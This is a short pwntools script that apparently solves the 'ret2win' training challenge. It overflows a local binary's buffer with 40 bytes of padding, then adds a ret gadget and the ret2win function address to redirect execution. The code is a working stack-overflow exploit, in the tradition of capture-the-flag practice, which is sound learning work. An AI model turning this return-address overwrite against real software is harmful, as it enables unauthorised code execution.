from pwn import *

p = process("./ret2win")
elf = ELF("./ret2win")
rop = ROP(elf)

buffer = b"A" * 40
win_addr = elf.symbols["ret2win"]
ret_gadget = rop.find_gadget(["ret"]).address

print(f"win address: {win_addr},\n ret_gadget: {ret_gadget}")


payload = buffer + p64(ret_gadget) + p64(win_addr)

p.sendlineafter(b"> ", payload)
out = p.recvall()

print(out)
